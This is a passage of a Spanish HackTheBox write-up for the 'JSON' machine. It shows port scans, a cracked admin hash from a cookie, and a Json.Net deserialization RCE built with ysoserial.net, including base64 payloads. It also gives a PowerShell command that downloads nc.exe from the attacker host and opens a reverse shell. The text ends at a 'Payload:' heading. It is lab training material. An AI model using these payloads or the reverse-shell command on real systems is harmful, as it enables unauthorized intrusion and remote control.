&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/json# masscan -p1-65535,U:1-65535 10.10.10.158 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-30 22:56:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49153/tcp on 10.10.10.158                                 
Discovered open port 445/tcp on 10.10.10.158                                   
Discovered open port 5985/tcp on 10.10.10.158                                  
Discovered open port 139/tcp on 10.10.10.158                                   
Discovered open port 49155/tcp on 10.10.10.158                                 
Discovered open port 135/tcp on 10.10.10.158                                   
Discovered open port 47001/tcp on 10.10.10.158                                 
Discovered open port 49157/tcp on 10.10.10.158                                 
Discovered open port 21/tcp on 10.10.10.158                                    
Discovered open port 49152/tcp on 10.10.10.158

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Sep 30 19:14:28 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.158&lt;/span&gt;
Warning: 10.10.10.158 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.158
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;64567&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;954&lt;/span&gt; filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Sep 30 19:19:17 2019 -- 1 IP address (1 host up) scanned in 289.09 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Sep 30 19:20:55 2019 as: nmap -p 21,80,135,139,445,5985,47001 -sV -sC -o services_script.nmap 10.10.10.158&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.158
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.56s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 - &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
Service Info: OSs: Windows, Windows Server &lt;span class=&#34;m&#34;&gt;2008&lt;/span&gt; R2 - 2012&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 4h00m42s, deviation: 0s, median: 4h00m42s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_nbstat: NetBIOS name: JSON, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:bd:94:b0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smb-os-discovery: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-10-01T03:24:25
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-10-01T00:14:50

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Sep 30 19:24:33 2019 -- 1 IP address (1 host up) scanned in 217.67 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Intentamos logearnos al servicio ftp con el usuario y contraseña anonymous pero no esta autorizado el usuario, tambien podemos ver la version del servicio ftp.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-02%2020.31.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Algunos directorios y paginas encontradas con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.10.158
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions:     php,txt,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No status:      &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/30 20:23:11 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/css
/files
/img
/index.html
/Index.html
/index.html
/js
/login.html
/Login.html
/views
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/30 20:35:16 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;indexhtml&#34;&gt;/index.html&lt;/h3&gt;
&lt;p&gt;Visitamos el index de la pagina y nos muestra una plataforma.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-03%2022.17.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;loginhtml&#34;&gt;/login.html&lt;/h3&gt;
&lt;p&gt;Vemos una pagina de inicio de sesion en esta pagina.&lt;/p&gt;
&lt;p&gt;Verificamos las peticiones en index.html y encontramos que en el header existe una Cookie del tipo OAuth2 y tambien.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-03%2023.20.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Decodificamos el string en base64 vemos el usuario y contraseña de admin.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;UserName&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;21232f297a57a5a743894a0e4a801fc3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User Admin HTB&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Rol&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Administrator&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-03%2023.55.22.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos el hash del usuario admin en crackstation, el cual no sirve de nada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;21232f297a57a5a743894a0e4a801fc3:admin
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-03%2023.56.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enviamos una solicitud erronea en base64, la cual contenia un mensaje: &amp;ldquo;Lorem ipsum&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-03%2023.50.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Vemos que dentro del mensaje de error nos muestra &amp;ldquo;Cannot deserialize Json.Net Object&amp;rdquo;.&lt;/p&gt;
&lt;h2 id=&#34;jsonnet-rce---deserialization&#34;&gt;Json.net RCE - Deserialization&lt;/h2&gt;
&lt;p&gt;Investigamos acerca del framework Json.net y vemos que existe una vulnerabilidad.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&#34;&gt;&lt;strong&gt;Json Attacks&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos ysoserial.net para poder generar nuestro payload codificado y enviarlo a la maquina, para esto utilizamos el PoC y lo modificamos.&lt;/p&gt;
&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Windows.Data.ObjectDataProvider,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PresentationFramework,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=31bf3856ad364e35&amp;#39;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;MethodName&amp;#39;:&amp;#39;Start&amp;#39;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;MethodParameters&amp;#39;:{&lt;/span&gt;
        &lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Collections.ArrayList,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;mscorlib,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=b77a5c561934e089&amp;#39;,&lt;/span&gt;
        &lt;span class=&#34;err&#34;&gt;&amp;#39;$values&amp;#39;:[&amp;#39;cmd&amp;#39;,&amp;#39;/c&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;calc&amp;#39;]&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;&amp;#39;ObjectInstance&amp;#39;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;$type&amp;#39;:&amp;#39;System.Diagnostics.Process,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;System,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Version=4.0.0.0,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Culture=neutral,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;PublicKeyToken=b77a5c561934e089&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos dos pruebas uno para hacer ping a nuestra maquina local y uno para hacer una prueba de resolucion de dominios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;ping -n 5 10.10.14.147&amp;#34;&lt;/span&gt; -t &amp;gt; payload_jsonnet_ping.txt

ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcGluZyAtbiA1IDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;nslookup sckull 10.10.14.147&amp;#34;&lt;/span&gt; -t &amp;gt; payload_jsonnet_nslookup.txt

ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbnNsb29rdXAgc2NrdWxsIDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Respuesta en Responder (nslookup) y tcpdump (ping).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/Screenshot%20from%202019-10-04%2000.03.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---userpool&#34;&gt;SHELL - userpool&lt;/h2&gt;
&lt;p&gt;Tomamos el PoC que utilizamos para hacer ping a nuestra maquina y lo modificamos agregandole un comando de powershell para descargar netcat (nc.exe) y, al mismo tiempo ejecutar una shell inversa con netcat.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;powershell -Command &lt;span class=&#34;s2&#34;&gt;&amp;#34;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
